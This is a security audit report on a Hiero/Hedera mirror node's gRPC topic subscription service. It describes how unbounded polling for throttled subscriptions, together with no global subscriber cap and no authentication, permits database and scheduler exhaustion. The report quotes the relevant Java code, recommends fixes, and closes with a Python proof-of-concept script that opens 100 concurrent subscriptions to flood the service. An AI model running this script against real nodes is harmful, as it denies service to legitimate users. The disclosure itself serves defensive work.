# Audit Report

## Title
Unbounded Concurrent Throttled Subscriptions Enable Resource Exhaustion via Infinite Polling Loop

## Summary
`PollingTopicMessageRetriever` unconditionally sets `numRepeats = Long.MAX_VALUE` for throttled subscriptions, and `TopicMessageServiceImpl` tracks subscriber count only as a Micrometer gauge with no enforcement cap. An unauthenticated attacker can open many gRPC connections — each allowing 5 concurrent subscriptions — targeting a topic with large historical data, causing each subscription to poll the database every 2 seconds indefinitely, exhausting DB connections and scheduler threads and starving legitimate subscribers.

## Finding Description

**`PollingTopicMessageRetriever.java`, `PollingContext` constructor, lines 98–101:**
```java
if (throttled) {
    numRepeats = Long.MAX_VALUE;          // no upper bound
    frequency = retrieverProperties.getPollingFrequency();  // default 2s
    maxPageSize = retrieverProperties.getMaxPageSize();     // default 1000
}
``` [10](#0-9) 

The `RepeatSpec` loop at line 52 runs up to `numRepeats` iterations, gated only by `context.isComplete()`:
```java
.repeatWhen(RepeatSpec.create(r -> !context.isComplete(), context.getNumRepeats())
        .jitter(0.1)
        .withFixedDelay(context.getFrequency())
        .withScheduler(scheduler))
``` [11](#0-10) 

**`isComplete()` for the throttled path (lines 121–128):**
```java
if (throttled) {
    return pageSize.get() < retrieverProperties.getMaxPageSize() || limitHit;
}
``` [2](#0-1) 

For a topic with millions of historical messages, every page returns exactly 1000 rows (`maxPageSize` default), so `pageSize.get() < maxPageSize` is always `false`, and `limitHit` is `false` when no limit is set. `isComplete()` never returns `true`, and the loop runs to `Long.MAX_VALUE`.

**`TopicMessageServiceImpl.java` — subscriber count is metrics-only:**
```java
private final AtomicLong subscriberCount = new AtomicLong(0L);
// ...
Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
        .register(meterRegistry);
// ...
.doOnSubscribe(s -> subscriberCount.incrementAndGet())
.doFinally(s -> subscriberCount.decrementAndGet())
``` [3](#0-2) [12](#0-11) 

`subscriberCount` is never read before accepting a new subscription. There is no rejection gate.

**`ConsensusController.subscribeTopic()` — no authentication:**
```java
public void subscribeTopic(ConsensusTopicQuery request, StreamObserver<ConsensusTopicResponse> responseObserver) {
    final var disposable = Mono.fromCallable(() -> toFilter(request))
            .flatMapMany(topicMessageService::subscribeTopic)
            ...
``` [13](#0-12) 

No API key, token, or identity check is performed.

**Per-connection limit is not global:**
`maxConcurrentCallsPerConnection = 5` (default) is enforced per TCP connection, not globally across all connections. [5](#0-4) 

**The 60-second timeout does not protect against this attack:**
```java
.timeout(retrieverProperties.getTimeout(), scheduler)
``` [8](#0-7) 

Reactor's `timeout` fires only if **no item is emitted** for the specified duration. For a large topic, each poll emits 1000 messages, so the timeout never fires while data flows.

**Root cause:** The design assumes either (a) historical data is finite and exhausted quickly, or (b) per-connection limits are sufficient. Both assumptions fail: a topic with large history keeps pages full indefinitely, and `maxConcurrentCallsPerConnection=5` is per-connection, not global.

## Impact Explanation

- **DB connection exhaustion:** Each active poll holds a JDBC connection for the duration of `topicMessageRepository.findByFilter(newFilter)`. With enough concurrent subscriptions, the HikariCP pool is fully occupied, causing legitimate queries to time out.
- **Scheduler thread starvation:** `Schedulers.boundedElastic()` has a bounded thread cap (`10 × CPU cores`). Hundreds of polling tasks competing on this scheduler delay the live message path for legitimate subscribers.
- **No natural termination:** As long as the topic has a full page of messages on each poll, the throttled retriever never completes. The `retryWhen(Retry.backoff(Long.MAX_VALUE, ...))` at line 58 additionally ensures that even transient errors do not terminate the subscription.
- **Severity: High** — complete denial of new-message delivery to legitimate subscribers is achievable with a modest number of attacker connections.

## Likelihood Explanation

- The gRPC `subscribeTopic` endpoint is unauthenticated and publicly reachable on port 5600.
- No API key, token, or identity check is performed in `ConsensusController.subscribeTopic()`.
- Opening many TCP connections and issuing `subscribeTopic` RPCs requires only a standard gRPC client library.
- The attack is repeatable and persistent: subscriptions survive until the attacker disconnects or the server runs out of resources.
- A topic with large history is trivially available on mainnet (any high-volume HCS topic).

## Recommendation

1. **Enforce a global subscriber cap:** Before accepting a new subscription in `TopicMessageServiceImpl.subscribeTopic()`, check `subscriberCount` against a configurable maximum and return an appropriate gRPC status error (e.g., `RESOURCE_EXHAUSTED`) if exceeded.
2. **Add a wall-clock timeout for throttled retrievers:** In addition to the inactivity timeout, add a maximum total duration for any single throttled retrieval session (e.g., configurable `maxRetrievalDuration`), so a subscription cannot hold resources indefinitely.
3. **Rate-limit subscriptions per IP/client:** Implement connection-level or IP-level rate limiting at the gRPC server or load balancer layer.
4. **Introduce authentication/authorization:** Require clients to present a valid token before subscribing, enabling per-client quotas and abuse tracking.
5. **Cap `numRepeats` for throttled path:** Consider a configurable upper bound on the number of polls even in the throttled path, forcing clients to re-subscribe if they need to continue.

## Proof of Concept

```python
import grpc
from concurrent import futures
# Standard gRPC client
from hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from hederahashgraph.api.proto.java import timestamp_pb2, basic_types_pb2

NUM_CONNECTIONS = 20  # 20 connections × 5 calls = 100 concurrent subscriptions

def open_subscription(stub):
    request = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=<HIGH_VOLUME_TOPIC>),
        # No consensusStartTime = start from genesis (all historical messages)
        # No limit = unlimited
    )
    for _ in stub.subscribeTopic(request):
        pass  # consume messages to keep connection alive

channels = [grpc.insecure_channel("mirror-node:5600") for _ in range(NUM_CONNECTIONS)]
stubs = [consensus_service_pb2_grpc.ConsensusServiceStub(ch) for ch in channels]

with futures.ThreadPoolExecutor(max_workers=NUM_CONNECTIONS * 5) as executor:
    for stub in stubs:
        for _ in range(5):  # maxConcurrentCallsPerConnection = 5
            executor.submit(open_subscription, stub)
    # All 100 subscriptions now poll DB every 2s indefinitely
    # HikariCP pool exhausted; legitimate subscribers time out
```

Each of the 100 subscriptions calls `topicMessageRepository.findByFilter(...)` every 2 seconds. With a default HikariCP pool of 10 connections, the pool is saturated within seconds, and legitimate subscriber queries queue indefinitely.
